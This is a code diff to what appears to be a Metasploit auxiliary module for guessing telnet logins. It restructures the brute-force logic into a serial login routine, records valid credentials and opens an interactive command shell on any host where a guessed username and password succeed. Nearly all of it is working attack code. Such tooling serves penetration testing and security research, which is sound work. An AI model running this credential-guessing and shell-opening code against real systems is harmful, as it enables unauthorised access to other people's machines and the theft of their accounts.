@@ -47,15 +47,14 @@ class Metasploit3 < Msf::Auxiliary
 		deregister_options('RHOST')
 		register_options(
 			[
-				OptInt.new('ATTEMPTS', [ false, 'Number of login attempts before reconnecting', 3 ]),
 				OptBool.new('VERBOSE', [ true, 'Verbose output', false])
 			], Msf::Exploit::Remote::Telnet
 		)
 
-		@attempts = 0
-		@got_shell = false
+		@no_pass_prompt = []
 	end
 
+	attr_accessor :no_pass_prompt
 
 	def run_host(ip)
 		print_status("Starting host #{ip}")
@@ -66,65 +65,75 @@ class Metasploit3 < Msf::Auxiliary
 		rescue ::Rex::ConnectionError
 			return
 		end
-		disconnect if not @got_shell
 	end
 
 	def try_user_pass(user, pass)
 		this_cred = [user,rhost,rport].join(":")
-		if self.credentials_tried[this_cred] == pass || self.credentials_good[this_cred]
+		if self.credentials_tried[this_cred] == pass || self.credentials_good[this_cred] || self.no_pass_prompt.include?(this_cred)
 			return :tried
 		else
 			self.credentials_tried[this_cred] = pass
 		end
 		print_status "#{rhost}:#{rport} Telnet - Attempting: '#{user}':'#{pass}'" if datastore['VERBOSE']
-		if @got_shell
-			@got_shell = false
-			@attempts = 0
-			connect
-		elsif (@attempts % datastore["ATTEMPTS"] == 0)
-			disconnect
-			connect
-		end
 
-		if password_prompt?
-			send_pass(pass)
-		elsif login_prompt?
-			send_user(user)
-			# Ubuntu's telnetd gives a failure right away when trying to login
-			# as root. Skipping this user in that instance saves a lot of time
-			# but might unnecessarily skip users, especially on high-latency
-			# networks.
-			#return :next_user if not password_prompt?
-			send_pass(pass)
-		end
-
-		# if we don't have a pass or a login prompt, maybe it's just an
-		# unauthenticated shell, so check for success anyway.
-
-		if (login_succeeded?)
-			print_good("#{rhost} - SUCCESSFUL LOGIN #{user} : #{pass}")
-			self.credentials_good[this_cred] = pass
-			report_auth_info(
-				:host	=> rhost,
-				:proto	=> 'telnet',
-				:user	=> user,
-				:pass	=> pass,
-				:targ_host	=> rhost,
-				:targ_port	=> datastore['RPORT']
-			)
-			@got_shell = true
-			# Windows telnet server requires \r\n line endings and it doesn't
-			# seem to affect anything else.
-			sock.extend(CRLFLineEndings)
-			sess = Msf::Sessions::CommandShell.new(sock)
-			framework.sessions.register(sess)
-			ret = :next_user
+		ret = do_login(user,pass)
+		if ret == :no_pass_prompt
+			self.no_pass_prompt << this_cred
 		else
-			ret = nil
+			start_telnet_session if login_succeeded?
 		end
+	end
 
-		@attempts += 1
-		return ret
+	# Making this serial since the @attempts counting business is causing
+	# all kinds of syncing problems.
+	def do_login(user,pass)
+		connect
+		if login_succeeded?
+			report_telnet(user,pass)
+			return :no_auth_required
+		else
+			send_user(user)
+			if password_prompt?
+				send_pass(pass)
+				if login_succeeded?
+					report_telnet(user,pass)
+					return :success
+				else
+					disconnect
+					return :fail
+				end
+			else
+				if login_succeeded? && @recvd !~ /^#{user}\x0d*\x0a/
+					report_telnet(user,pass)
+					return :no_pass_required
+				else
+					disconnect
+					return :no_pass_prompt
+				end
+			end
+		end
+	end
+
+	def report_telnet(user,pass)
+		this_cred = [user,rhost,rport].join(":")
+		print_good("#{rhost} - SUCCESSFUL LOGIN #{user} : #{pass}")
+		self.credentials_good[this_cred] = pass
+		report_auth_info(
+			:host	=> rhost,
+			:proto	=> 'telnet',
+			:user	=> user,
+			:pass	=> pass,
+			:targ_host	=> rhost,
+			:targ_port	=> datastore['RPORT']
+		)
+	end
+
+	def start_telnet_session
+		# Windows telnet server requires \r\n line endings and it doesn't
+		# seem to affect anything else.
+		sock.extend(CRLFLineEndings)
+		sess = Msf::Sessions::CommandShell.new(sock)
+		framework.sessions.register(sess)
 	end
 
 end
